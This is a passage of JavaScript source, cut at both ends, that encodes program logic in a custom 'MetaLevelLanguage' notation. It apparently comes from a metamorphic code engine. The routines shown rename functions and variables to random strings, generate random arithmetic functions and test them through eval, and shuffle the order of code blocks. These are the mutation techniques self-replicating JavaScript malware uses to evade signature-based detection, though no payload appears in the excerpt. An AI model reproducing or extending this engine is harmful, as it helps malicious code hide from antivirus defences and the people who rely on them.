        MetaLevelLanguage+='__(PCA100|)y°+CopyMetaLevelLanguage2+°=#x1#O1°+CopyMetaLevelLanguage2+°#.substring(#x2#O2°+CopyMetaLevelLanguage2+°#.indexOf(#x3#x4fGiveMeString(#n41n#)+fGiveMeString(#n102n#)+fGiveMeString(#n117n#)+fGiveMeString(#n110n#)4x#+#x5fGiveMeString(#n99n#)+fGiveMeString(#n116n#)+fGiveMeString(#n105n#)5x#+#x6fGiveMeString(#n111n#)+fGiveMeString(#n110n#)+fGiveMeString(#n32n#)6x#3x#)2O#+#n1n#2x#)1O#1x#';
        MetaLevelLanguage+='__(PCA200|PCA100)var PCFunctionName=#x1#O1°+CopyMetaLevelLanguage2+°#.substring(#x2#n9n#2x#,#x3#O2°+CopyMetaLevelLanguage2+°#.indexOf(fGiveMeString(#n40n#))2O#3x#)1O#1x#';
        MetaLevelLanguage+='__(PCA300|)var PCRandomVariableName=#x1fGiveRandomString()1x#';
        MetaLevelLanguage+='__(PCA400|PCA200,PCA300)while($#x1#O1sMetaLevelLanguage#.indexOf(#x2°+PCFunctionName+°2x#)1O#1x#!-1?!=@)001';
            MetaLevelLanguage+='__(PCAA100|)ysMetaLevelLanguage=#x1#O1sMetaLevelLanguage#.replace(#x2°+PCFunctionName+°2x#,#x3°+PCRandomVariableName+°3x#)1O#1x#';
        MetaLevelLanguage+='__(PCA500|PCA100)var PCFctArguments=#x1#O1°+CopyMetaLevelLanguage2+°#.substring(#x2#O2°+CopyMetaLevelLanguage2+°#.indexOf(fGiveMeString(#n40n#))2O#+#n1n#2x#,#x3#O3°+CopyMetaLevelLanguage2+°#.indexOf(#x4fGiveMeString(#n41n#)4x#)3O#3x#)1O#1x#';
        MetaLevelLanguage+='__(PCA600|)var SingleFArguments=#x1#""#1x#';
        MetaLevelLanguage+='__(PCA700|PCA500,PCA600)if(#x1#O1°+PCFctArguments+°#.length1O#1x#!#x2#n0n#2x#?>)001';
            MetaLevelLanguage+='__(PCAA100|)y°+SingleFArguments+°=#x1#O1°+PCFctArguments+°#.split(#x2fGiveMeString(#x3#n44n#3x#)2x#)1O#1x#';
        MetaLevelLanguage+='__(PCA800|)000';
        MetaLevelLanguage+='__(PCA900|PCA700)while(var PCCount1=#n0n#$#x1°+PCCount1+°1x#!#x2#O1°+SingleFArguments+°#.length1O#2x#?<@°+PCCount1+°=#x3#x4°+PCCount1+°4x# +#x5#n1n#5x#3x#)003';
            MetaLevelLanguage+='__(PCAA100|)var RandomVariableNameArgs=#x1fGiveRandomString()1x#';
            MetaLevelLanguage+='__(PCAA200|PCAA100)while($#x1#O1sMetaLevelLanguage#.indexOf(#x2°+SingleFArguments+°[#x3°+PCCount1+°3x#]2x#)1O#1x#!-1?!=@)001';
                MetaLevelLanguage+='__(PCAAA100|)ysMetaLevelLanguage=#x1#O1sMetaLevelLanguage#.replace(#x2°+SingleFArguments+°[#x3°+PCCount1+°3x#]2x#,#x4°+RandomVariableNameArgs+°4x#)1O#1x#';
    
    // Function Creation
    MetaLevelLanguage+='__(PC1100|PC0200,VDef004,VDef005,VDef006)while(var PCNumberOfFunctionCreation=#n0n#$#x1°+PCNumberOfFunctionCreation+°1x#!#x2#n35n#2x#?<@°+PCNumberOfFunctionCreation+°=#x3#x4°+PCNumberOfFunctionCreation+°4x# +#x5#n1n#5x#3x#)046';     
        MetaLevelLanguage+='__(PCA100|)var PCFgramm=#x1#"(SOS)O(SOS)"#1x#';
        MetaLevelLanguage+='__(PCA200|PCA100)while($#x1#O1°+PCFgramm+°#.indexOf(#x2#"S"#2x#)1O#1x#!#x3#n-1n#3x#?!=@)004';
            MetaLevelLanguage+='__(PCAA100|)if(#x1fGiveRandomNumber(#x2#n4n#2x#)1x#!#x3#n0n#3x#?==)001';
                MetaLevelLanguage+='__(PCAAA100|)y°+PCFgramm+°=#x1#O1°+PCFgramm+°#.replace(#x2#"S"#2x#,#x3#"(SOS)"#3x#)1O#1x#';
            MetaLevelLanguage+='__(PCAA200|)001';
                MetaLevelLanguage+='__(PCAAA100|)y°+PCFgramm+°=#x1#O1°+PCFgramm+°#.replace(#x2#"S"#2x#,#x3#"X"#3x#)1O#1x#';                                            
        MetaLevelLanguage+='__(PCA300|PCA200)while($#x1#O1°+PCFgramm+°#.indexOf(#x2#"O"#2x#)1O#1x#!#x3#n-1n#3x#?!=@)002';
            MetaLevelLanguage+='__(PCAA100|)var PCOperatorArray=#x1[#x2#"+"#2x#,#x3#"+"#3x#,#x4#"-"#4x#,#x5#"-"#5x#,#x6#"*"#6x#,#x7#"%"#7x#]1x#';
            MetaLevelLanguage+='__(PCAA200|PCAA100)y°+PCFgramm+°=#x1#O1°+PCFgramm+°#.replace(#x2#"O"#2x#,#x3°+PCOperatorArray+°[#x4fGiveRandomNumber(#n6n#)4x#]3x#)1O#1x#'; 
        MetaLevelLanguage+='__(PCA400|)var PCFunctionArguments=#x1[]1x#'; 
        MetaLevelLanguage+='__(PCA500|)var PCFunctionArgLength=#x1#x2fGiveRandomNumber(#n4n#)2x#+#x3#n2n#3x#1x#'; 
        MetaLevelLanguage+='__(PCA600|PCA200,PCA400,PCA500)while(var PCCountRSc1=#x1#n0n#1x#$#x2°+PCCountRSc1+°2x#!#x3°+PCFunctionArgLength+°3x#?!=@°+PCCountRSc1+°=#x4°+PCCountRSc1+° +#n1n#4x#)001';
            MetaLevelLanguage+='__(PCAA100|)y#O1°+PCFunctionArguments+°#.push(#x2fGiveRandomString()2x#)1O#';
        MetaLevelLanguage+='__(PCA700|PCA600)while($#x1#O1°+PCFgramm+°#.indexOf(#x2#"X"#2x#)1O#1x#!#x3#n-1n#3x#?!=@)004';
            MetaLevelLanguage+='__(PCAA100|)if(#x1fGiveRandomNumber(#x3#n2n#3x#)1x#!#x2#n0n#2x#?==)001';
                MetaLevelLanguage+='__(PCAAA100|)y°+PCFgramm+°=#x1#O1°+PCFgramm+°#.replace(#x2#"X"#2x#,#x3°+PCFunctionArguments+°[#x4fGiveRandomNumber(#x5#O2°+PCFunctionArguments+°#.length2O#5x#)4x#]3x#)1O#1x#';
            MetaLevelLanguage+='__(PCAA200|)001';
                MetaLevelLanguage+='__(PCAAA100|)y°+PCFgramm+°=#x1#O1°+PCFgramm+°#.replace(#x2#"X"#2x#,#x3fGiveRandomNumber(#x4#n256n#4x#)3x#)1O#1x#';  
        MetaLevelLanguage+='__(PCA750|PCA600)var PCVarCount1=#x1#O1°+PCFunctionArguments+°#.length1O#1x#';
        MetaLevelLanguage+='__(PCA800|PCA700,PCA750)while($#x1°+PCVarCount1+°1x#!#x2#n0n#2x#?>@°+PCVarCount1+°=#x3#x4°+PCVarCount1+°4x# -#x5#n1n#5x#3x#)003';
            MetaLevelLanguage+='__(PCAA100|)if(#x1#O1°+PCFgramm+°#.indexOf(#x2°+PCFunctionArguments+°[#x3°+PCVarCount1+°3x#]2x#)1O#1x#!#x4#n-1n#4x#?==)001';
                MetaLevelLanguage+='__(PCAAA100|)y#O1°+PCFunctionArguments+°#.splice(#x1°+PCVarCount1+°1x#,#x2#n1n#2x#)1O#';            
            MetaLevelLanguage+='__(PCAA200|)000';
        MetaLevelLanguage+='__(PCA900|PCA300,PCA800)if(#x1#O1°+PCFunctionArguments+°#.length1O#1x#!#x2#n0n#2x#?>)021';
            MetaLevelLanguage+='__(PCAA100|)var PCFname=#x1fGiveRandomString()1x#';
            MetaLevelLanguage+='__(PCAA200|PCAA100)var PCGgramm=#x1#x2#"function "#2x#+#x3 °+PCFname+° 3x#+#x4#"("#4x#+#x5 #O1°+PCFunctionArguments+°#.join()1O#5x#+#x6#"){return("#6x#+#x7 °+PCFgramm+° 7x#+#x8#");}"#8x#1x#';            
            MetaLevelLanguage+='__(PCAA300|PCAA200)yeval(#x1°+PCGgramm+°1x#)';
            MetaLevelLanguage+='__(PCAA400|)var PCIsItAUsefulFunction=#x1#n0n#1x#';
            MetaLevelLanguage+='__(PCAA500|PCAA300,PCAA400)while(var PCEvalFctC=#x1#n0n#1x#$#x2°+PCEvalFctC+°2x#!#x3#n100n#3x#?<@°+PCEvalFctC+°=#x4°+PCEvalFctC+°4x# +#x5#n1n#5x#)011';            
                MetaLevelLanguage+='__(PCAAA100|)var PCFFilledArguments=#x1[]1x#';            
                MetaLevelLanguage+='__(PCAAA200|PCAAA100)while(var PCFFc=#x1#n0n#1x#$#x2°+PCFFc+°2x#!#x3#O1°+PCFunctionArguments+°#.length1O#3x#?<@°+PCFFc+°=#x4#x5°+PCFFc+°5x# +#n1n#4x#)001';
                    MetaLevelLanguage+='__(PCAAAA100|)y#O1°+PCFFilledArguments+°#.push(#x1fGiveRandomNumber(#x2#n256n#2x#)1x#)1O#';                                                 
                MetaLevelLanguage+='__(PCAAA300|PCAAA200)var PCFCall=#x1#x2°+PCFname+° 2x#+#x3#"("#3x#+ #x4#O1°+PCFFilledArguments+°#.join()1O#4x#+#x5#")"#5x#1x#';   
                MetaLevelLanguage+='__(PCAAA400|PCAAA300)var PCFResult=#x1eval(#x2°+PCFCall+°2x#)1x#';      
                MetaLevelLanguage+='__(PCAAA500|PCAAA400)if(#x1°+PCFResult+°1x#!#x2#n0n#2x#?>=)004';             
                    MetaLevelLanguage+='__(PCAAAA100|)if(°+PCFResult+°!256?<)002';
                        MetaLevelLanguage+='__(PCAAAAA100|)y°+PCIsItAUsefulFunction+°=#x1#n1n#1x#';
                        MetaLevelLanguage+='__(PCAAAAA200|)y#O1°+FullArray+°[#x1°+PCFResult+°1x#]#.push(#x2°+PCFCall+°2x#)1O#';                                          
                    MetaLevelLanguage+='__(PCAAAA200|)000';
                MetaLevelLanguage+='__(PCAAA600|)000';                        
            MetaLevelLanguage+='__(PCAA600|PCAA500)if(#x1°+PCIsItAUsefulFunction+°1x#!#x2#n1n#2x#?==)003';
                MetaLevelLanguage+='__(PCAAA100|)y#O1°+sFunctionDefs+°.push(#x1#x2#"return "#2x#+#x3 °+PCFgramm+°3x#1x#)1O#';            
                MetaLevelLanguage+='__(PCAAA200|)y#O1°+sFunctionArgs+°.push(#x1#"("#+#x2 #O2°+PCFunctionArguments+°#.join()2O#2x#+#x3")"3x#1x#)1O#';              
                MetaLevelLanguage+='__(PCAAA300|)y#O1°+sFunctionNames+°.push(#x1°+PCFname+°1x#)1O#';             
            MetaLevelLanguage+='__(PCAA700|)000';
        MetaLevelLanguage+='__(PCB900|)000';      
                               
                               
                               
MetaLevelLanguage+='__(1700|)function fPermutator(argPermutatorMLL)042'; 
    MetaLevelLanguage+='__(PM0100|)var PMInfoCodeArray=#x1[]1x#';
    MetaLevelLanguage+='__(PM0200|)var PMPermIdentifier=#x1[]1x#';
    MetaLevelLanguage+='__(PM0300|)var PMRequiredCodes=#x1[]1x#';
    MetaLevelLanguage+='__(PM0400|)var PMMLLcount=#x1#n0n#1x#';
    MetaLevelLanguage+='__(PM0500|PM0100,PM0200,PM0300,PM0400)while(var MLLPermC1=#x1#n0n#1x#$#x2°+PMMLLcount+°2x#!#x3#O1°+argPermutatorMLL+°#.length1O#3x#?<@°+MLLPermC1+°=#x4#x5°+MLLPermC1+°5x# +#x6#n1n#6x#4x#)026'; 
        MetaLevelLanguage+='__(PMA0100|)y°+PMPermIdentifier+°[#x7°+MLLPermC1+°7x#]=#x1#O1°+argPermutatorMLL+°[#x2°+PMMLLcount+°2x#]#.substring(#x3#O2°+argPermutatorMLL+°[°+PMMLLcount+°]#.indexOf("(")2O#+#x4#n1n#4x#3x#,#x5#O3°+argPermutatorMLL+°[#x6°+PMMLLcount+°6x#]#.indexOf("|")3O#5x#)1O#1x#';  
        MetaLevelLanguage+='__(PMA0200|)y°+PMRequiredCodes+°[#x6°+MLLPermC1+°6x#]=#x1#O1°+argPermutatorMLL+°[#x2°+PMMLLcount+°2x#]#.substring(#x3#O2°+argPermutatorMLL+°[#x4°+PMMLLcount+°4x#]#.indexOf(#x5#"|"#5x#)2O#+#n1n#3x#,#x8#O3°+argPermutatorMLL+°[#x9°+PMMLLcount+°9x#]#.indexOf(#x7#")"#7x#)3O#8x#)1O#1x#'; 
        MetaLevelLanguage+='__(PMA0300|)y°+PMInfoCodeArray+°[#x1°+MLLPermC1+°1x#]=#x2[]2x#';
        MetaLevelLanguage+='__(PMA0400|PMA0300)y°+PMInfoCodeArray+°[#x1°+MLLPermC1+°1x#][#x2#n0n#2x#]=#x3#O1°+argPermutatorMLL+°[#x4°+PMMLLcount+°4x#]#.substring(#x5#O2°+argPermutatorMLL+°[#x8°+PMMLLcount+°8x#]#.indexOf(#x7#")"#7x#)2O#+#x6#n1n#6x#5x#)1O#3x#';
        MetaLevelLanguage+='__(PMA0500|PMA0100,PMA0200,PMA0400)if(#x1#O1°+PMInfoCodeArray+°[#x2°+MLLPermC1+°2x#][#x3#n0n#3x#]#.substring(#x4#n0n#4x#,#x5#n2n#5x#)1O#1x#!#x6#"if"#6x#?==)009'; 
            MetaLevelLanguage+='__(PMAA100|)var PMNumberOfLinesIf=#x1parseInt(#x2#O1°+argPermutatorMLL+°[#x4°+PMMLLcount+°4x#]#.substring(#x9#x5#O2°+argPermutatorMLL+°[#x6°+PMMLLcount+°6x#]#.lastIndexOf(#x7#")"#7x#)2O#5x#+#x8#n1n#8x#9x#)1O#2x#,#x3#n10n#3x#)1x#';
            MetaLevelLanguage+='__(PMAA200|PMAA100)y°+PMInfoCodeArray+°[#x1°+MLLPermC1+°1x#]=#x2#O1°+PMInfoCodeArray+°[#x3°+MLLPermC1+°3x#]#.concat(#x4fPermutator(#x5#O2°+argPermutatorMLL+°#.slice(#x6#x7°+PMMLLcount+°7x# +#n1n#6x#,#x8#x9°+PMMLLcount+° + °+PMNumberOfLinesIf+°9x# +#n1n#8x#)2O#5x#)4x#)1O#2x#';
            MetaLevelLanguage+='__(PMAA300|PMAA200)y°+PMMLLcount+°=#x1#x2#x3°+PMMLLcount+°3x# + #x5°+PMNumberOfLinesIf+°5x#2x# +#x4#n1n#4x#1x#';     // pointer to else-line (which contains the number of elements contained in else)
            MetaLevelLanguage+='__(PMAA400|PMAA300)var PMNumberOfLinesElse=#x1parseInt(#x2#O1°+argPermutatorMLL+°[#x4°+PMMLLcount+°4x#]#.substring(#x5#O2°+argPermutatorMLL+°[#x7°+PMMLLcount+°7x#]#.lastIndexOf(#x8#")"#8x#)2O#+#x6#n1n#6x#5x#)1O#2x#,#x3#n10n#3x#)1x#';           
            MetaLevelLanguage+='__(PMAA500|PMAA300)y°+PMInfoCodeArray+°[#x1°+MLLPermC1+°1x#]=#x2#O1°+PMInfoCodeArray+°[#x3°+MLLPermC1+°3x#]#.concat(#x4#O2°+argPermutatorMLL+°[#x5°+PMMLLcount+°5x#]#.substring(#x8#O3°+argPermutatorMLL+°[#x6°+PMMLLcount+°6x#]#.lastIndexOf(#x7#")"#7x#)3O#+#n1n#8x#)2O#4x#)1O#2x#';// add the else-number part
            MetaLevelLanguage+='__(PMAA600|PMAA400,PMAA500)if(#x1°+PMNumberOfLinesElse+°1x#!#x2#n0n#2x#?>)001';                // if there are lines in the else-part, add them
                MetaLevelLanguage+='__(PMB100|)y°+PMInfoCodeArray+°[#x1°+MLLPermC1+°1x#]=#x2#O1°+PMInfoCodeArray+°[#x3°+MLLPermC1+°3x#]#.concat(#x4#O2fPermutator(#x5#O3°+argPermutatorMLL+°#.slice(#x6#x7°+PMMLLcount+° 7x#+#n1n#6x#,#x8°+PMMLLcount+° +#x9 °+PMNumberOfLinesElse+° 9x#+#n1n#8x#)3O#5x#)2O#4x#)1O#2x#'; 
            MetaLevelLanguage+='__(PMAA700|)000';
            MetaLevelLanguage+='__(PMAA800|PMAA600)y°+PMMLLcount+°=#x1#x2°+PMMLLcount+° 2x#+#x3 °+PMNumberOfLinesElse+°3x#1x#';
        MetaLevelLanguage+='__(PMA0600|)000';            
        MetaLevelLanguage+='__(PMA0700|PMA0100,PMA0200,PMA0400)if(#x1#O1°+PMInfoCodeArray+°[#x2°+MLLPermC1+°2x#][#x3#n0n#3x#]#.substring(#x4#n0n#4x#,#x5#n5n#5x#)1O#1x#!#x6#"while"#6x#?==)003';
            MetaLevelLanguage+='__(PMB100|)var PMNumberOfLinesWhile=#x1parseInt(#x2#O1°+argPermutatorMLL+°[#x4°+PMMLLcount+°4x#]#.substring(#x5#x6#O2°+argPermutatorMLL+°[#x7°+PMMLLcount+°7x#]#.lastIndexOf(#x8#")"#8x#)2O#6x#+#n1n#5x#)1O#2x#,#x3#n10n#3x#)1x#';  // OK
            MetaLevelLanguage+='__(PMB200|PMB100)y°+PMInfoCodeArray+°[#x1°+MLLPermC1+°1x#]=#x2#O1°+PMInfoCodeArray+°[#x3°+MLLPermC1+°3x#]#.concat(#x4fPermutator(#x5#O2°+argPermutatorMLL+°#.slice(#x6°+PMMLLcount+° +#n1n#6x#,#x7#x8°+PMMLLcount+°8x# +#x9 °+PMNumberOfLinesWhile+° 9x#+#n1n#7x#)2O#5x#)4x#)1O#2x#';
            MetaLevelLanguage+='__(PMB300|PMB200)y°+PMMLLcount+°=#x1#x2°+PMMLLcount+° 2x#+#x3 °+PMNumberOfLinesWhile+°3x#1x#';
        MetaLevelLanguage+='__(PMA0800|)000';
        MetaLevelLanguage+='__(PMA0900|PMA0100,PMA0200,PMA0400)if(#x1#O1°+PMInfoCodeArray+°[#x2°+MLLPermC1+°2x#][#x3#n0n#3x#]#.substring(#x4#n0n#4x#,#x5#n9n#5x#)1O#1x#!#x6#"function "#6x#?==)003';  
            MetaLevelLanguage+='__(PMB100|)var PMNumberOfLinesFunction=#x1parseInt(#x2#O1°+argPermutatorMLL+°[#x4°+PMMLLcount+°4x#]#.substring(#x5#O2°+argPermutatorMLL+°[#x7°+PMMLLcount+°7x#]#.lastIndexOf(#x6#")"#6x#)2O#+#n1n#5x#)1O#2x#,#x3#n10n#3x#)1x#';
            MetaLevelLanguage+='__(PMB200|PMB100)y°+PMInfoCodeArray+°[#x1°+MLLPermC1+°1x#]=#x2#O1°+PMInfoCodeArray+°[#x3°+MLLPermC1+°3x#]#.concat(#x4fPermutator(#x5#O2°+argPermutatorMLL+°#.slice(#x6°+PMMLLcount+° +#n1n#6x#,#x7#x8°+PMMLLcount+° 8x#+#x9 °+PMNumberOfLinesFunction+° 9x#+#n1n#7x#)2O#5x#)4x#)1O#2x#';
            MetaLevelLanguage+='__(PMB300|PMB200)y°+PMMLLcount+°=#x1#x2°+PMMLLcount+° 2x#+#x3 °+PMNumberOfLinesFunction+°3x#1x#';
        MetaLevelLanguage+='__(PMA1000|)000';
        MetaLevelLanguage+='__(PMA1100|PMA0100,PMA0200,PMA0500,PMA0700,PMA0900)c+1(°+PMMLLcount+°)';
    MetaLevelLanguage+='__(PM0600|PM0500)y#O1°+PMRequiredCodes+°#.push()1O#';                   
    MetaLevelLanguage+='__(PM0700|)var PermutatedCodeArray=#x1[]1x#';
    MetaLevelLanguage+='__(PM0800|PM0600,PM0700)while($#x1#O1°+PMInfoCodeArray+°#.length1O#1x#!#x2#n0n#2x#?>@)007';  
        MetaLevelLanguage+='__(PMA100|)var PMRandomElement=#x1fGiveRandomNumber(#x2#O1°+PMInfoCodeArray+°#.length1O#2x#)1x#';           
        MetaLevelLanguage+='__(PMA200|PMA100)if(#x1#O1#O2°+PMRequiredCodes+°#.toString()2O##.indexOf(#x2°+PMPermIdentifier+°[#x3°+PMRandomElement+°3x#]2x#)1O#1x#!#x4#n-1n#4x#?==)004';   // OK
            MetaLevelLanguage+='__(PMB100|)y°+PermutatedCodeArray+°=#x1#O1°+PMInfoCodeArray+°[#x2°+PMRandomElement+°2x#]#.concat(#x3°+PermutatedCodeArray+°3x#)1O#1x#';
            MetaLevelLanguage+='__(PMB200|PMB100)y#O1°+PMInfoCodeArray+°#.splice(#x1°+PMRandomElement+°1x#,#x2#n1n#2x#)1O#';
            MetaLevelLanguage+='__(PMB300|)y#O1°+PMPermIdentifier+°#.splice(#x1°+PMRandomElement+°1x#,#x2#n1n#2x#)1O#';
            MetaLevelLanguage+='__(PMB400|)y#O1°+PMRequiredCodes+°#.splice(#x1°+PMRandomElement+°1x#,#x2#n1n#2x#)1O#';
        MetaLevelLanguage+='__(PMA300|)000';
    MetaLevelLanguage+='__(PM0900|PM0800)xreturn(#x1#O1°+PermutatedCodeArray+°#.slice()1O#1x#)';




MetaLevelLanguage+='__(1800|)function fCreateObjectExecution(argCOE1)026'; 
    MetaLevelLanguage+='__(CEO0100|)while($#x1#O1°+argCOE1+°#.indexOf(#x2#x3fGiveMeString(#x5#n35n#5x#)3x#+#x4fGiveMeString(#x6#n79n#6x#)4x#2x#)1O#1x#!#x7#n-1n#7x#?!=@)003';
        MetaLevelLanguage+='__(CEOA100|)var COEObjectNumber=#x1#O1°+argCOE1+°#.charAt(#x2#O2°+argCOE1+°#.indexOf(#x4#x5fGiveMeString(#x7#n35n#7x#)5x#+#x6fGiveMeString(#x8#n79n#8x#)6x#4x#)2O#+#x3#n2n#3x#2x#)1O#1x#'; 
        MetaLevelLanguage+='__(CEOA200|CEOA100)var COEFullObject=#x1#O1°+argCOE1+°#.substring(#x2#O2°+argCOE1+°#.indexOf(#x6fGiveMeString(#n35n#)+fGiveMeString(#n79n#)6x#)2O#+#n3n#2x#,#x3#O3°+argCOE1+°#.indexOf(#x4#x7°+COEObjectNumber+°7x# +#x5#x8fGiveMeString(79)8x#+fGiveMeString(35)5x#4x#)3O#3x#)1O#1x#'; // OK
        MetaLevelLanguage+='__(CEOA300|CEOA200)y°+argCOE1+°=#x1#x2#O1°+argCOE1+°#.substring(#n0n#,#x3#O2°+argCOE1+°#.indexOf(#x4fGiveMeString(#n35n#)+fGiveMeString(#n79n#)4x#)2O#3x#)1O#2x#+#x5fCreateObjectExecution(#x6°+COEFullObject+°6x#)5x#+ #x7#O3°+argCOE1+°#.substring(#x8#O4°+argCOE1+°#.indexOf(#x9°+COEObjectNumber+° +fGiveMeString(#n79n#)+fGiveMeString(#n35n#)9x#)4O#+#n3n#8x#)3O#7x#1x#';
    MetaLevelLanguage+='__(CEO0200|CEO0100)while($#x1#O1°+argCOE1+°#.indexOf(#x2#x3fGiveMeString(#x5#n35n#5x#)3x#+#x4fGiveMeString(#x6#n46n#6x#)4x#2x#)1O#1x#!#x7#n-1n#7x#?!=@)020';
        MetaLevelLanguage+='__(CEOA100|)if(#x1fGiveRandomNumber(#x2#n3n#2x#)1x#!#x3#n0n#3x#?==)017'; 
            MetaLevelLanguage+='__(CEOB100|)var COEObjectName=#x1fGiveRandomString()1x#';
            MetaLevelLanguage+='__(CEOB200|)var COEVariableList=#x1[]1x#';
            MetaLevelLanguage+='__(CEOB300|)var COEVariableRndList=#x1[]1x#';
            MetaLevelLanguage+='__(CEOB400|)var COEObjString=#x1#O1°+argCOE1+°#.substring(#x2#n0n#2x#,#x3#O2°+argCOE1+°#.indexOf(#x4#x5fGiveMeString(#x7#n35n#7x#)5x#+#x6fGiveMeString(#x8#n46n#8x#)6x#4x#)2O#3x#)1O#1x#';
            MetaLevelLanguage+='__(CEOB500|CEOB400)while($#x1#O1°+COEObjString+°#.indexOf(#x2#x3fGiveMeString(#x5#n35n#5x#)3x#+#x4fGiveMeString(#x6#n120n#6x#)4x#2x#)1O#1x#!#x7#n-1n#7x#?!=@)003';
                MetaLevelLanguage+='__(CEOC100|)var COEexecNum=#x1#O1°+COEObjString+°#.charAt(#x2#O2°+COEObjString+°#.indexOf(#x4#x5fGiveMeString(#x7#n35n#7x#)5x#+#x6fGiveMeString(#x8#n120n#8x#)6x#4x#)2O#+#x3#n2n#3x#2x#)1O#1x#';
                MetaLevelLanguage+='__(CEOC200|CEOC100)y°+COEObjString+°=#x1#O1°+COEObjString+°#.replace(#x2#x3#x4fGiveMeString(#x6#n35n#6x#)4x#+fGiveMeString(#x7#n120n#7x#)3x#+#x8 °+COEexecNum+°8x#2x#,#x5#""#5x#)1O#1x#';
                MetaLevelLanguage+='__(CEOC300|CEOC200)y°+COEObjString+°=#x1#O1°+COEObjString+°#.replace(#x4#x2#x3°+COEexecNum+° 3x#+fGiveMeString(#x6#n120n#6x#)2x#+fGiveMeString(#x7#n35n#7x#)4x#,#x5#""#5x#)1O#1x#';
            MetaLevelLanguage+='__(CEOB600|CEOB200,CEOB300,CEOB500)y°+COEObjString+°=#x1fCreateVariableListForFunctionCalls(#x2°+COEObjString+°2x#,#x3°+COEVariableList+°3x#,#x4°+COEVariableRndList+°4x#)1x#';
            MetaLevelLanguage+='__(CEOB700|CEOB600)y#O1sFunctionDefs#.push(#x2#x3#x4#"return "#4x#+ #x6°+COEObjString+°6x#3x#2x#)1O#';  
            MetaLevelLanguage+='__(CEOB800|CEOB100)y#O1sFunctionNames#.push(#x1°+COEObjectName+°1x#)1O#'; 
            MetaLevelLanguage+='__(CEOB900|CEOB600)y#O1sFunctionArgs#.push(#x1#x2#"("#2x#+#x3 #O2°+COEVariableRndList+°#.join()2O#3x#+#x4")"4x#1x#)1O#';    
            MetaLevelLanguage+='__(CEOB910|CEOB600)var COEReturnValue=#x1#O1°+COEVariableList+°#.join(#x2#x3fGiveMeString(#x8#n43n#8x#)3x#+#x4fGiveMeString(#x9#n176n#9x#)4x#+#x5#","#5x#+#x6fGiveMeString(#n176n#)6x#+#x7fGiveMeString(#n43n#)7x#2x#)1O#1x#';
            MetaLevelLanguage+='__(CEOB920|CEOB910)if(#x1#O1°+COEVariableList+°#.length1O#1x#!#x2#n0n#2x#?>)001';
                MetaLevelLanguage+='__(CEOC100|)y°+COEReturnValue+°=#x1#x2fGiveMeString(#n176n#)2x#+#x3fGiveMeString(#n43n#)3x#+#x4 °+COEReturnValue+° 4x#+#x5fGiveMeString(#n43n#)5x#+#x6fGiveMeString(#n176n#)6x#1x#';
            MetaLevelLanguage+='__(CEOB930|)000';
            MetaLevelLanguage+='__(CEOB940|CEOB100,CEOB700,CEOB800,CEOB900,CEOB920)y°+argCOE1+°=#x1fCreateObjectExecution(#x2#x3°+COEObjectName+° 3x#+#x4"("4x#+#x5 °+COEReturnValue+° 5x#+#x6")"6x#+#x7 #O1°+argCOE1+°#.substring(#x8#O2°+argCOE1+°#.indexOf(#x9fGiveMeString(#n35n#)+fGiveMeString(#n46n#)9x#)2O#+#n1n#8x#)1O#7x#2x#)1x#';
        MetaLevelLanguage+='__(CEOA200|)001'; 
            MetaLevelLanguage+='__(CEOB100|)y°+argCOE1+°=#x1fCreateObjectExecution(#x2#O1°+argCOE1+°#.replace(#x3#x4fGiveMeString(#x8#n35n#8x#)4x#+#x5fGiveMeString(46)5x#3x#,#x6fGiveMeString(#x7#n46n#7x#)6x#)1O#2x#)1x#';           
    MetaLevelLanguage+='__(CEO0300|CEO0200)xreturn(#x1°+argCOE1+°1x#)';   



MetaLevelLanguage+='__(1900|)function fExecutionParser(argEP1)005';
    MetaLevelLanguage+='__(EP100|)while($#x1#O1°+argEP1+°#.indexOf(#x2#x3fGiveMeString(35)3x#+#x4fGiveMeString(120)4x#2x#)1O#1x#!#x5#n-1n#5x#?!=@)003';
        MetaLevelLanguage+='__(EPA100|)var EPExecutionNumber=#x1#O1°+argEP1+°#.charAt(#x2#O2°+argEP1+°#.indexOf(#x3#x4fGiveMeString(#x6#n35n#6x#)4x#+#x5fGiveMeString(#x7#n120n#7x#)5x#3x#)2O#+#x8#n2n#8x#2x#)1O#1x#'; 
        MetaLevelLanguage+='__(EPA200|EPA100)var EPnewExecutionToReplace=#x1#O1°+argEP1+°#.substring(#x2#O2°+argEP1+°#.indexOf(fGiveMeString(#x5#n35n#5x#)+fGiveMeString(120))2O#+#n3n#2x#,#x3#O3°+argEP1+°#.indexOf(#x4°+EPExecutionNumber+° +fGiveMeString(#x6#n120n#6x#)+fGiveMeString(#x7#n35n#7x#)4x#)3O#3x#)1O#1x#';   // OK
        MetaLevelLanguage+='__(EPA300|EPA200)y°+argEP1+°=#x1#O1°+argEP1+°#.substring(#x2#n0n#2x#,#x3#O2°+argEP1+°#.indexOf(#x4fGiveMeString(#n35n#)+fGiveMeString(#n120n#)4x#)2O#3x#)+#x5fDeriveRestrictVC(#x6fExecutionParser(#x7°+EPnewExecutionToReplace+°7x#)6x#,#n75n#,#n1n#)5x#+ #x8#O4°+argEP1+°#.substring(#x9#O5°+argEP1+°#.indexOf(°+EPExecutionNumber+° +fGiveMeString(#n120n#)+fGiveMeString(#n35n#))5O#9x#+3)4O#8x#1O#1x#';
    MetaLevelLanguage+='__(EP200|EP100)xreturn(#x1°+argEP1+°1x#)';



MetaLevelLanguage+='__(2000|)function fCreateBlockOfCode(argCodeBlockArray)254';
    MetaLevelLanguage+='__(CBC0100|)var CBCRString=#x1#""#1x#';
    MetaLevelLanguage+='__(CBC0200|)var CBCCodeLineIndex=#x1#n0n#1x#';
    MetaLevelLanguage+='__(CBC0300|)var CBCLocalVarName=#x1[]1x#';
    MetaLevelLanguage+='__(CBC0400|)var CBCLocalVarDefs=#x1[]1x#';
    MetaLevelLanguage+='__(CBC0500|)c+1(°+sHierarchyOfCalls+°)';
    MetaLevelLanguage+='__(CBC0600|CBC0100,CBC0200,CBC0300,CBC0400,CBC0500)while($#x1°+CBCCodeLineIndex+°1x#!#x2#O1°+argCodeBlockArray+°#.length1O#2x#?<@)230';
        MetaLevelLanguage+='__(CBCA100|)var CBCSingleElement=#x1#x2°+argCodeBlockArray+°2x#[#x3°+CBCCodeLineIndex+°3x#]1x#';
        MetaLevelLanguage+='__(CBCA200|CBCA100)while($#x1#O1°+CBCSingleElement+°#.indexOf(#x2#x3fGiveMeString(#x4#n35n#4x#)3x#+#x5fGiveMeString(#x6#n34n#6x#)5x#2x#)1O#1x#!-1?!=@)002';
